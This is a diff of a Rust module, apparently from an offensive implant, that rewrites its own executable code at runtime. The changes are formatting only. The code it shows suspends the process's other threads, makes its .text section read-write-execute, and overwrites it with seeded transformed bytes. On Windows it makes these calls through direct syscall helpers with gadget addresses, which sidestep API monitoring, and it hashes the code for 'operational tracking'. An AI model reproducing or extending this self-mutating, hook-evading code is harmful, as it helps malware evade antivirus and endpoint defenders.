@@ -74,9 +74,7 @@ pub fn derive_default_seed(session_key: &[u8; 32]) -> u64 {
     let seed = u64::from_le_bytes(hash[..8].try_into().expect("slice is 8 bytes"));
     // Ensure non-zero
     let seed = if seed == 0 { 1u64 } else { seed };
-    log::info!(
-        "self_reencode: auto-derived default seed 0x{seed:016x} from session key + OsRng"
-    );
+    log::info!("self_reencode: auto-derived default seed 0x{seed:016x} from session key + OsRng");
     seed
 }
 
@@ -126,7 +124,11 @@ pub fn derive_fresh_seed(server_nonce: u64) -> u64 {
     // regardless of input — ChaCha8RNG with zero seed is still valid but
     // using a non-zero value avoids the degenerate "always same" case if
     // someone passes 0 as the nonce).
-    if seed == 0 { 1 } else { seed }
+    if seed == 0 {
+        1
+    } else {
+        seed
+    }
 }
 
 // ── Platform-specific .text section location ──────────────────────────────
@@ -231,8 +233,8 @@ fn find_text_section_windows() -> Result<TextSection> {
 fn find_text_section_linux() -> Result<TextSection> {
     // Parse the ELF headers of /proc/self/exe to find the .text section.
     // We read the binary file and look up the section header table.
-    let exe_data = std::fs::read("/proc/self/exe")
-        .context("self_reencode: failed to read /proc/self/exe")?;
+    let exe_data =
+        std::fs::read("/proc/self/exe").context("self_reencode: failed to read /proc/self/exe")?;
 
     let elf = goblin::elf::Elf::parse(&exe_data)
         .map_err(|e| anyhow::anyhow!("self_reencode: failed to parse ELF headers: {e}"))?;
@@ -426,8 +428,8 @@ fn find_text_section_macos() -> Result<TextSection> {
 fn find_load_base() -> Result<usize> {
     let maps = std::fs::read_to_string("/proc/self/maps")
         .context("self_reencode: failed to read /proc/self/maps")?;
-    let exe_path = std::fs::read_link("/proc/self/exe")
-        .unwrap_or_else(|_| std::path::PathBuf::from(""));
+    let exe_path =
+        std::fs::read_link("/proc/self/exe").unwrap_or_else(|_| std::path::PathBuf::from(""));
     let exe_name = exe_path.to_string_lossy();
 
     for line in maps.lines() {
@@ -488,11 +490,15 @@ impl FrozenThreads {
 
         while let Some((handle, _prev)) = self.handles.pop() {
             let mut dummy: u32 = 0;
-            let _ = crate::syscalls::get_syscall_id("NtResumeThread").map(|t| {
-                unsafe { crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64, &mut dummy as *mut u32 as u64]) }
+            let _ = crate::syscalls::get_syscall_id("NtResumeThread").map(|t| unsafe {
+                crate::syscalls::do_syscall(
+                    t.ssn,
+                    t.gadget_addr,
+                    &[handle as u64, &mut dummy as *mut u32 as u64],
+                )
             });
-            let _ = crate::syscalls::get_syscall_id("NtClose").map(|t| {
-                unsafe { crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64]) }
+            let _ = crate::syscalls::get_syscall_id("NtClose").map(|t| unsafe {
+                crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64])
             });
         }
         log::debug!("self_reencode: all sibling threads resumed");
@@ -503,7 +509,9 @@ impl FrozenThreads {
 impl Drop for FrozenThreads {
     fn drop(&mut self) {
         if !self.thawed {
-            log::warn!("self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming");
+            log::warn!(
+                "self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming"
+            );
             self.thaw();
         }
     }
@@ -578,12 +586,16 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
         let mut return_len: u32 = 0;
         let status = crate::syscalls::get_syscall_id("NtQuerySystemInformation")
             .map(|t| unsafe {
-                crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[
-                    SYSTEM_PROCESS_INFORMATION_CLASS as u64,
-                    buf.as_mut_ptr() as u64,
-                    buf_len as u64,
-                    &mut return_len as *mut u32 as u64,
-                ])
+                crate::syscalls::do_syscall(
+                    t.ssn,
+                    t.gadget_addr,
+                    &[
+                        SYSTEM_PROCESS_INFORMATION_CLASS as u64,
+                        buf.as_mut_ptr() as u64,
+                        buf_len as u64,
+                        &mut return_len as *mut u32 as u64,
+                    ],
+                )
             })
             .map_err(|e| anyhow::anyhow!("NtQuerySystemInformation resolve failed: {e}"))?;
 
@@ -612,12 +624,21 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
             );
         }
 
-        let next_entry =
-            u32::from_ne_bytes(buf[offset + SPI_NEXT_ENTRY_OFFSET..][..4].try_into().unwrap());
-        let num_threads =
-            u32::from_ne_bytes(buf[offset + SPI_NUMBER_OF_THREADS..][..4].try_into().unwrap());
-        let pid =
-            usize::from_ne_bytes(buf[offset + SPI_UNIQUE_PROCESS_ID..][..8].try_into().unwrap());
+        let next_entry = u32::from_ne_bytes(
+            buf[offset + SPI_NEXT_ENTRY_OFFSET..][..4]
+                .try_into()
+                .unwrap(),
+        );
+        let num_threads = u32::from_ne_bytes(
+            buf[offset + SPI_NUMBER_OF_THREADS..][..4]
+                .try_into()
+                .unwrap(),
+        );
+        let pid = usize::from_ne_bytes(
+            buf[offset + SPI_UNIQUE_PROCESS_ID..][..8]
+                .try_into()
+                .unwrap(),
+        );
 
         if pid == my_pid {
             found = true;
@@ -632,9 +653,8 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                 if ti + STI_STRIDE > buf.len() {
                     break;
                 }
-                let tid = usize::from_ne_bytes(
-                    buf[ti + STI_CLIENT_ID_THREAD..][..8].try_into().unwrap(),
-                );
+                let tid =
+                    usize::from_ne_bytes(buf[ti + STI_CLIENT_ID_THREAD..][..8].try_into().unwrap());
 
                 // Skip the calling thread.
                 if tid == my_tid {
@@ -657,29 +677,31 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                 };
 
                 let mut handle: usize = 0;
-                let open_status = crate::syscalls::get_syscall_id("NtOpenThread").map(|t| {
-                    unsafe {
-                        crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[
+                let open_status = crate::syscalls::get_syscall_id("NtOpenThread").map(|t| unsafe {
+                    crate::syscalls::do_syscall(
+                        t.ssn,
+                        t.gadget_addr,
+                        &[
                             &mut handle as *mut usize as u64,
                             THREAD_SUSPEND_RESUME as u64,
                             &obj_attr as *const OBJECT_ATTRIBUTES as u64,
                             &cid as *const ClientId as u64,
-                        ])
-                    }
+                        ],
+                    )
                 });
 
                 match open_status {
                     Ok(s) if s >= 0 => {
                         // Successfully opened — suspend it.
                         let mut prev_suspend: u32 = 0;
-                        let susp_status = crate::syscalls::get_syscall_id("NtSuspendThread").map(|t| {
-                            unsafe {
-                                crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[
-                                    handle as u64,
-                                    &mut prev_suspend as *mut u32 as u64,
-                                ])
-                            }
-                        });
+                        let susp_status =
+                            crate::syscalls::get_syscall_id("NtSuspendThread").map(|t| unsafe {
+                                crate::syscalls::do_syscall(
+                                    t.ssn,
+                                    t.gadget_addr,
+                                    &[handle as u64, &mut prev_suspend as *mut u32 as u64],
+                                )
+                            });
                         match susp_status {
                             Ok(s) if s >= 0 => {
                                 handles.push((handle, prev_suspend));
@@ -689,18 +711,28 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                                     "self_reencode: NtSuspendThread(tid={:#x}) returned {:#010x}, closing handle",
                                     tid, s
                                 );
-                                let _ = crate::syscalls::get_syscall_id("NtClose").map(|t| {
-                                    unsafe { crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64]) }
-                                });
+                                let _ =
+                                    crate::syscalls::get_syscall_id("NtClose").map(|t| unsafe {
+                                        crate::syscalls::do_syscall(
+                                            t.ssn,
+                                            t.gadget_addr,
+                                            &[handle as u64],
+                                        )
+                                    });
                             }
                             Err(e) => {
                                 log::warn!(
                                     "self_reencode: NtSuspendThread resolve failed for tid={:#x}: {e}, closing handle",
                                     tid
                                 );
-                                let _ = crate::syscalls::get_syscall_id("NtClose").map(|t| {
-                                    unsafe { crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64]) }
-                                });
+                                let _ =
+                                    crate::syscalls::get_syscall_id("NtClose").map(|t| unsafe {
+                                        crate::syscalls::do_syscall(
+                                            t.ssn,
+                                            t.gadget_addr,
+                                            &[handle as u64],
+                                        )
+                                    });
                             }
                         }
                     }
@@ -708,7 +740,8 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                         // Access denied or similar — skip silently.
                         log::debug!(
                             "self_reencode: NtOpenThread(tid={:#x}) returned {:#010x}, skipping",
-                            tid, s
+                            tid,
+                            s
                         );
                     }
                     Err(e) => {
@@ -800,7 +833,9 @@ impl FrozenThreads {
 impl Drop for FrozenThreads {
     fn drop(&mut self) {
         if !self.thawed {
-            log::warn!("self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming");
+            log::warn!(
+                "self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming"
+            );
             self.thaw();
         }
     }
@@ -826,14 +861,8 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                 continue;
             }
             // Send SIGSTOP via tgkill (not kill, to be precise about target).
-            let ret = unsafe {
-                libc::syscall(
-                    libc::SYS_tgkill,
-                    pid,
-                    tid,
-                    libc::SIGSTOP as libc::c_long,
-                )
-            };
+            let ret =
+                unsafe { libc::syscall(libc::SYS_tgkill, pid, tid, libc::SIGSTOP as libc::c_long) };
             if ret == 0 {
                 tids.push(tid);
             } else {
@@ -920,7 +949,9 @@ impl FrozenThreads {
 impl Drop for FrozenThreads {
     fn drop(&mut self) {
         if !self.thawed {
-            log::warn!("self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming");
+            log::warn!(
+                "self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming"
+            );
             self.thaw();
         }
     }
@@ -934,7 +965,11 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
 
         let mut thread_list: *mut MachPort = std::ptr::null_mut();
         let mut thread_count: u32 = 0;
-        let kr = task_threads(task, &mut thread_list as *mut *mut MachPort, &mut thread_count as *mut u32);
+        let kr = task_threads(
+            task,
+            &mut thread_list as *mut *mut MachPort,
+            &mut thread_count as *mut u32,
+        );
         if kr != KERN_SUCCESS {
             let _ = mach_port_deallocate(task, self_thread);
             anyhow::bail!("self_reencode: task_threads failed with kern_return_t {kr}");
@@ -1047,8 +1082,8 @@ pub unsafe fn reencode_text(seed: u64) -> Result<()> {
     let mut frozen = freeze_threads().context("self_reencode: freeze sibling threads")?;
 
     // 4. Make pages writable, write transformed code, restore protections.
-    let old_prot = make_writable(text.base, text.size)
-        .context("self_reencode: make .text writable")?;
+    let old_prot =
+        make_writable(text.base, text.size).context("self_reencode: make .text writable")?;
 
     // Write the transformed bytes.
     std::ptr::copy_nonoverlapping(transformed.as_ptr(), text.base as *mut u8, write_len);
@@ -1105,24 +1140,24 @@ unsafe fn make_writable(addr: usize, len: usize) -> Result<ProtSnapshot> {
     let mut base_ptr = aligned as *mut libc::c_void;
     let mut region_size = aligned_len;
     let mut old_prot: u32 = 0;
-    let status = crate::syscalls::get_syscall_id("NtProtectVirtualMemory")
-        .map(|t| unsafe {
-            crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[
+    let status = crate::syscalls::get_syscall_id("NtProtectVirtualMemory").map(|t| unsafe {
+        crate::syscalls::do_syscall(
+            t.ssn,
+            t.gadget_addr,
+            &[
                 -1isize as u64,                    // current process handle
                 &mut base_ptr as *mut _ as u64,    // base address (in/out)
                 &mut region_size as *mut _ as u64, // region size (in/out)
                 0x40u64,                           // PAGE_EXECUTE_READWRITE
                 &mut old_prot as *mut _ as u64,
-            ])
-        });
+            ],
+        )
+    });
 
     // Non-negative NTSTATUS means success.
     match status {
         Ok(s) if s >= 0 => Ok(ProtSnapshot(old_prot)),
-        Ok(s) => anyhow::bail!(
-            "NtProtectVirtualMemory(RWX) returned NTSTATUS {:#010x}",
-            s
-        ),
+        Ok(s) => anyhow::bail!("NtProtectVirtualMemory(RWX) returned NTSTATUS {:#010x}", s),
         Err(e) => anyhow::bail!("NtProtectVirtualMemory(RWX) syscall failed: {}", e),
     }
 }
@@ -1137,16 +1172,19 @@ unsafe fn restore_protection(addr: usize, len: usize, old: &ProtSnapshot) -> Res
     let mut base_ptr = aligned as *mut libc::c_void;
     let mut region_size = aligned_len;
     let mut dummy: u32 = 0;
-    let status = crate::syscalls::get_syscall_id("NtProtectVirtualMemory")
-        .map(|t| unsafe {
-            crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[
+    let status = crate::syscalls::get_syscall_id("NtProtectVirtualMemory").map(|t| unsafe {
+        crate::syscalls::do_syscall(
+            t.ssn,
+            t.gadget_addr,
+            &[
                 -1isize as u64,
                 &mut base_ptr as *mut _ as u64,
                 &mut region_size as *mut _ as u64,
                 old.0 as u64,
                 &mut dummy as *mut _ as u64,
-            ])
-        });
+            ],
+        )
+    });
 
     match status {
         Ok(s) if s >= 0 => Ok(()),
@@ -1162,7 +1200,11 @@ unsafe fn restore_protection(addr: usize, len: usize, old: &ProtSnapshot) -> Res
 unsafe fn flush_icache(addr: usize, len: usize) {
     // NtFlushInstructionCache for current process.
     let _ = crate::syscalls::get_syscall_id("NtFlushInstructionCache").map(|t| {
-        crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[-1isize as u64, addr as u64, len as u64])
+        crate::syscalls::do_syscall(
+            t.ssn,
+            t.gadget_addr,
+            &[-1isize as u64, addr as u64, len as u64],
+        )
     });
 }
 
@@ -1183,10 +1225,7 @@ unsafe fn make_writable(addr: usize, len: usize) -> Result<ProtSnapshot> {
         libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
     ) != 0
     {
-        anyhow::bail!(
-            "mprotect(RWX) failed: {}",
-            std::io::Error::last_os_error()
-        );
+        anyhow::bail!("mprotect(RWX) failed: {}", std::io::Error::last_os_error());
     }
     Ok(ProtSnapshot(orig_prot))
 }
@@ -1383,8 +1422,7 @@ pub fn reencode_once(seed: u64) -> Result<()> {
 /// operational tracking.
 pub fn hash_text_section() -> Result<String> {
     let text = find_text_section().context("self_reencode: locate .text section for hashing")?;
-    let slice =
-        unsafe { std::slice::from_raw_parts(text.base as *const u8, text.size) };
+    let slice = unsafe { std::slice::from_raw_parts(text.base as *const u8, text.size) };
     let digest = Sha256::digest(slice);
     Ok(hex::encode(digest))
 }
